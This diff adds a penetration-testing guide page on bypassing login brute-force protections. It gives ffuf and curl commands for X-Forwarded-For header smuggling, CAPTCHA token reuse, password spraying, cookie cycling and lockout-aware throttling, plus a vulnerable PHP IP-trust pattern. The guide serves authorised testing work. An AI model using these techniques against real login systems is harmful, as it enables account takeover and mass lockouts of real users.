@@ -1,0 +1,310 @@
+---
+title: Bruteforce protections
+description: CAPTCHA, rate limits, lockouts, and IP-based controls - assessing whether they're robust or tamperable.
+mitre: [T1110, T1027]
+d3fend: [D3-AH, D3-CH]
+impact: [AuthBypass]
+owasp: [A07]
+cve: [CVE-2020-35590]
+sidebar:
+  order: 3
+  label: Bruteforce protections
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+Before brute-forcing anything, figure out what's stopping you. Three real protections (CAPTCHA, rate limits, lockouts) and several tamperable ones (IP-based, header-based, cookie-based). The tamperable ones are bypassable in one request.
+
+```
+# Header smuggling - pretend each request is from a different IP
+X-Forwarded-For: 1.2.3.4
+X-Real-IP: 5.6.7.8
+X-Originating-IP: 9.10.11.12
+X-Remote-IP: 13.14.15.16
+Client-IP: 17.18.19.20
+
+# Rate-limit-aware throttling (ffuf - one request every 7s)
+ffuf -w wordlist.txt:FUZZ -u https://<TARGET>/login \
+     -X POST -d "user=admin&pass=FUZZ" \
+     -t 1 -p 7
+
+# Read the CAPTCHA from the source - yes, sometimes it's there
+curl -s https://<TARGET>/login | grep -iE 'captcha|verify'
+```
+
+Success indicator: requests arrive at the application logic instead of being rejected at the perimeter.
+
+## What's actually blocking you?
+
+The first move is identification - what's the protection, where does it kick in, what unblocks it.
+
+```bash
+# Submit a few failed attempts in quick succession
+for i in 1 2 3 4 5 6; do
+  curl -s -o /tmp/resp.$i -w "%{http_code} " \
+    -X POST -d "user=admin&pass=wrong$i" \
+    https://<TARGET>/login
+done
+echo
+diff /tmp/resp.1 /tmp/resp.6 | head -20
+```
+
+Look at the diff. Common signals:
+
+- **After N attempts, the response gains a CAPTCHA element** → CAPTCHA-after-failures
+- **After N attempts, the response status changes (429 / 403)** → rate-limiting at the server
+- **After N attempts, the response body adds "try again in X seconds"** → server-side lockout
+- **After N attempts, the response is identical but later attempts fail** → silent IP-based lockout
+- **After 1 attempt, you get a CAPTCHA every time** → CAPTCHA-always
+- **Nothing changes** → no protection, or protection is downstream (WAF returning generic pages)
+
+## CAPTCHA
+
+CAPTCHA is the strongest commonly-deployed bruteforce protection - when it's implemented correctly. Several common ways to defeat or sidestep it:
+
+### Read the source
+
+The cheapest attack: check whether the CAPTCHA answer is in the page itself. This happens with custom or hastily-built CAPTCHAs more often than security marketing suggests.
+
+```bash
+curl -s https://<TARGET>/login | grep -iE 'captcha|challenge|verify'
+```
+
+Watch for:
+- Hidden form fields containing the expected answer
+- JavaScript variables holding the answer for client-side validation
+- CAPTCHA image filenames that include the answer (`/captcha/X4F2R.png`)
+- Math CAPTCHAs where the expected result is in a comment
+- Re-CAPTCHA-style widgets that actually pass-through any value
+
+A weak CAPTCHA implementation often follows the pattern: PHP generates the image and stores the answer in the `id` attribute of the `<img>` tag, so the validator can compare server-side. The image's `alt` or `id` attribute leaks the answer to anyone reading the source.
+
+### Bypass at the validator
+
+CAPTCHAs validate at submission. Sometimes the validator can be skipped:
+
+```bash
+# Submit without the captcha field
+POST /login   user=admin&pass=test               # no `captcha=` field at all
+
+# Submit with empty captcha
+POST /login   user=admin&pass=test&captcha=
+
+# Submit with the previous solved value reused
+POST /login   user=admin&pass=test&captcha=ALREADY_SOLVED_VALUE
+```
+
+The "reuse" pattern is the most common practical bypass - many CAPTCHA implementations don't invalidate the answer after a successful submission. Solve one CAPTCHA legitimately, capture its token, then reuse it for every brute-force attempt.
+
+### CAPTCHA-after-failures
+
+Some sites only require CAPTCHA after N failed attempts. The N is per-IP, per-username, or per-session - each has a bypass:
+
+- Per-IP → rotate IPs (header smuggling, see below; or actual proxy rotation)
+- Per-username → distribute attempts across many usernames (password spraying - one password, many usernames, see [Username enumeration](/codex/web/auth/username-enumeration/))
+- Per-session → drop and reissue the session cookie between attempts
+
+### Solving the CAPTCHA
+
+Out of scope for the operator path - image-recognition CAPTCHAs solved at scale are a commercial service, not a per-engagement task. If the CAPTCHA is reliable and you can't bypass the validator, drop to a slower attack or pivot to other paths in the cluster.
+
+## Rate limits
+
+A counter that increments on failed attempts and triggers a delay or block. Three implementation patterns, three different bypass approaches:
+
+### Per-IP rate limit
+
+Counter keyed on source IP. Bypass by changing the perceived source IP.
+
+If the application sits behind a load balancer or CDN, it usually reads the client IP from a header - and trusts whatever header the proxy is supposed to set. This is the canonical X-Forwarded-For abuse:
+
+```http
+POST /login HTTP/1.1
+Host: target.example.com
+X-Forwarded-For: 1.2.3.4
+Content-Type: application/x-www-form-urlencoded
+
+username=admin&password=wrong
+```
+
+Try every variant - different applications trust different headers:
+
+```
+X-Forwarded-For: 1.2.3.4
+X-Real-IP: 1.2.3.4
+X-Originating-IP: 1.2.3.4
+X-Remote-IP: 1.2.3.4
+X-Client-IP: 1.2.3.4
+Client-IP: 1.2.3.4
+X-Forwarded: 1.2.3.4
+Forwarded-For: 1.2.3.4
+Forwarded: for=1.2.3.4
+True-Client-IP: 1.2.3.4
+```
+
+If any of these are honored, you can rotate the IP per-request and defeat the per-IP rate limit completely. **CVE-2020-35590** documents this exact bypass against a WordPress security plugin - the plugin used `X-Forwarded-For` to identify the request source and then enforce per-IP limits, which the attacker controlled.
+
+Vulnerable PHP code pattern:
+
+```php
+if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) {
+    $realip = array_map('trim', explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']))[0];
+} else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER)) {
+    $realip = array_map('trim', explode(',', $_SERVER['HTTP_CLIENT_IP']))[0];
+} else if (array_key_exists('REMOTE_ADDR', $_SERVER)) {
+    $realip = array_map('trim', explode(',', $_SERVER['REMOTE_ADDR']))[0];
+}
+// Use $realip for rate-limit lookup - attacker controls $realip
+```
+
+Rotating headers per-request in `ffuf`:
+
+```bash
+ffuf -w wordlist.txt:FUZZ \
+     -u "https://<TARGET>/login" \
+     -X POST -d "user=admin&pass=FUZZ" \
+     -H "X-Forwarded-For: FUZZ"     # not what you want - FUZZ is shared
+```
+
+For per-request unique IPs, generate the IPs alongside the passwords:
+
+```bash
+# Use a script to write paired pairs into a file
+paste -d ':' wordlist.txt <(seq -f '10.0.0.%g' 1 $(wc -l < wordlist.txt)) > paired.txt
+
+ffuf -w paired.txt:PAIR \
+     -u "https://<TARGET>/login" \
+     -X POST -d "user=admin&pass=PASS_FROM_PAIR" \
+     -H "X-Forwarded-For: IP_FROM_PAIR"
+# (pseudocode - split PAIR with a helper)
+```
+
+In practice, just write a 30-line Python script. The fuzzer-only approach gets awkward fast.
+
+### Per-username rate limit
+
+Counter keyed on the submitted username. The submitted username field becomes the rate-limit key.
+
+Bypass by **spraying** - one password across many usernames, instead of many passwords against one username:
+
+```bash
+# Common password against a list of valid usernames
+ffuf -w usernames.txt:UNAME \
+     -u "https://<TARGET>/login" \
+     -X POST -d "user=UNAME&pass=Spring2024!" \
+     -mc 302
+```
+
+Per-username rate limits do nothing against spraying because each username only sees one attempt.
+
+### Per-session rate limit
+
+Counter keyed on session cookie. Drop the cookie between attempts.
+
+```bash
+# Don't reuse cookies - each request creates a fresh session
+ffuf -w wordlist.txt:FUZZ \
+     -u "https://<TARGET>/login" \
+     -X POST -d "user=admin&pass=FUZZ" \
+     -H "Cookie: "                                  # blank - start fresh each time
+```
+
+If the server requires a session cookie for the login endpoint to work (some do for CSRF), pre-fetch a cookie per attempt:
+
+```bash
+# Pseudocode - for each password, get fresh cookie, then attempt
+for pass in $(cat wordlist.txt); do
+  cookie=$(curl -s -c - https://<TARGET>/login | grep SESSION | awk '{print $7}')
+  curl -s -b "SESSION=$cookie" -X POST -d "user=admin&pass=$pass" https://<TARGET>/login
+done
+```
+
+## Lockouts
+
+A lockout is a rate limit with no automatic reset - the account stays blocked until manual intervention (admin unlock, password reset, time-based decay over hours).
+
+Lockouts are mostly defensive rather than security-positive - they trade brute-force protection for denial-of-service vulnerability. An attacker who knows valid usernames can lock every account in the application by submitting wrong passwords.
+
+**For testing purposes** lockouts are a hard constraint. If a real account gets locked during pentest, the user is irritated and the engagement looks bad. Two practical responses:
+
+1. **Slow enough to never trip the lockout.** If the policy is "lock after 5 failures in 10 minutes," limit to 4 attempts per 10-minute window. This makes brute-force impractical against any meaningful wordlist - accept that and pivot to other techniques in this cluster (reset tokens, username injection, session attacks).
+2. **Use a test account you control.** If the engagement scope permits creating accounts, create one, lock it on purpose, confirm the lockout policy, then plan around it for real-user accounts.
+
+The rate-limit-aware throttling pattern from your bruteforce script:
+
+```python
+# After a failed attempt, check whether the response is a generic "wrong password"
+# or a "you are locked out" message
+if "locked" in response.text.lower() or "try again in" in response.text.lower():
+    print(f"[!] Lockout detected after {attempts} attempts. Waiting 5 minutes.")
+    time.sleep(300)
+```
+
+A robust brute-force script teaches itself the lockout pattern from the first hit, then throttles to stay below it.
+
+## Other tamperable signals
+
+Beyond IP, applications sometimes key protections on other request properties:
+
+```
+User-Agent: trivially changed
+Accept-Language: trivially changed
+Referer: trivially changed
+Cookie-based fingerprint: dropped per request
+```
+
+Any single signal that can be tampered, can be bypassed. The robust implementations cluster on multiple signals (IP + UA + session + behavior pattern) - even those have weak points but require correspondingly more effort.
+
+## Probing the protection
+
+A small one-shot probe to map what's in place:
+
+```bash
+# Same wrong password, 10 times in a row, observe at what point behavior changes
+for i in $(seq 1 10); do
+  echo "=== Attempt $i ==="
+  curl -s -X POST -d "user=admin&pass=definitely-wrong" \
+    -w "Status: %{http_code}  Time: %{time_total}\n" \
+    -o /tmp/resp.$i \
+    https://<TARGET>/login
+done
+
+# Find where the response changed
+md5sum /tmp/resp.* | sort
+```
+
+Identical MD5s across all 10 = no per-request protection (or you're being silently blocked but not informed). Diverging MD5s = protection kicked in at the divergence point.
+
+## Detection-only payloads
+
+Probes that map the protection without committing to a brute-force:
+
+```bash
+# Header trust
+curl -X POST -d "user=admin&pass=wrong" -H "X-Forwarded-For: 1.1.1.1" https://<TARGET>/login
+curl -X POST -d "user=admin&pass=wrong" -H "X-Forwarded-For: 2.2.2.2" https://<TARGET>/login
+# If a rate-limit-style response after 5+ attempts with rotating IPs ≠ rate-limit-style
+# response after 5+ attempts with same IP, the header is being trusted
+
+# Lockout window
+curl -X POST -d "user=test&pass=$(date +%s)" https://<TARGET>/login    # 5 times rapidly
+# Then wait varying times, retry, observe at what wait length the response changes
+
+# CAPTCHA trigger
+curl -X POST -d "user=admin&pass=wrong" https://<TARGET>/login > /tmp/r1
+# 4-5 more failures, then:
+curl -s https://<TARGET>/login | diff - /tmp/r1
+# Captcha-related fields appearing → CAPTCHA-after-failures
+```
+
+## Notes
+
+- **WAF vs. application protection.** Some bruteforce blocks happen at the WAF (Cloudflare, AWS WAF, Akamai) before the request reaches the app. WAF blocks look like generic challenge pages or 403s - application blocks look like login-page reloads with error messages. Different bypass approaches: WAF blocks may yield to header smuggling or origin-direct access (if you can find the origin IP); application blocks need application-level bypasses.
+- **"Account suspended for security" emails.** When a real user gets one of these, the engagement becomes visible. Coordinate with the customer about acceptable lockout rates before brute-forcing real accounts.
+- **Successful-login rate limits exist too.** Some apps block too many *successful* logins from one IP (anti-credential-stuffing). This trips when an attacker tries valid creds against many accounts - the same source IP succeeds repeatedly, generating an alert. Less common but worth knowing if your spray works on 50 accounts and then stops.
+- **The IP-rotation arms race.** Mature applications detect X-Forwarded-For tampering by cross-checking against the actual TCP source IP. Bypass requires actually using multiple source IPs (residential proxy pool, Tor) - expensive enough that most engagements skip it and pivot.
+
+<Aside type="caution">
+The header-smuggling bypass is sometimes scoped out of pentest engagements specifically because it interacts with rate-limiting logic the customer relies on for legitimate DoS protection. Verify before depending on it as your primary brute-force enabler.
+</Aside>
